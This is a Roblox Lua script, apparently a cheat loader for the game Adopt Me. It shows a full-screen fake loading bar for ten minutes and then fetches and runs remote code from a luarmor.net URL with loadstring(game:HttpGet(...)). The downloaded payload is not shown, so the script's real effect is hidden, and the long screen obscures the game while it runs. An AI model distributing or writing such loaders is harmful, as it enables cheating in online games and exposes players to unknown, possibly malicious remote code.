local Players = game:GetService("Players")
local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "LoadingScreen"
gui.Parent = player:WaitForChild("PlayerGui")

-- Create background frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(1, 0, 1, 0)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.Parent = gui

-- Main text label
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 0.2, 0)
textLabel.Position = UDim2.new(0, 0, 0.4, 0)
textLabel.BackgroundTransparency = 1
textLabel.Text = "ADOPT ME OVERPOWERED SCRIPT"
textLabel.TextColor3 = Color3.new(1, 1, 1)
textLabel.Font = Enum.Font.SourceSansBold
textLabel.TextSize = 32
textLabel.Parent = frame

-- Loading bar
local loadingBar = Instance.new("Frame")
loadingBar.Size = UDim2.new(0.8, 0, 0.05, 0)
loadingBar.Position = UDim2.new(0.1, 0, 0.6, 0)
loadingBar.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
loadingBar.BorderSizePixel = 0
loadingBar.Parent = frame

local progress = Instance.new("Frame")
progress.Size = UDim2.new(0, 0, 1, 0)
progress.BackgroundColor3 = Color3.new(0, 0.7, 1)
progress.BorderSizePixel = 0
progress.Parent = loadingBar

-- First loading phase (3 minutes)
local function firstLoad()
    local startTime = tick()
    local duration = 180 -- 3 minutes
    
    while tick() - startTime < duration do
        progress.Size = UDim2.new((tick() - startTime)/duration, 0, 1, 0)
        wait(0.1)
    end
end

-- Second loading phase (7 minutes)
local function secondLoad()
    textLabel.Text = "EXECUTING SCRIPT..."
    progress.Size = UDim2.new(0, 0, 1, 0)
    
    local startTime = tick()
    local duration = 420 -- 7 minutes
    
    while tick() - startTime < duration do
        progress.Size = UDim2.new((tick() - startTime)/duration, 0, 1, 0)
        wait(0.1)
    end
end

-- Run the sequence
firstLoad()
secondLoad()

-- Execute the script after loading
gui:Destroy()
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/c29af06acdb7a80fb239415fd322efe9.lua"))()
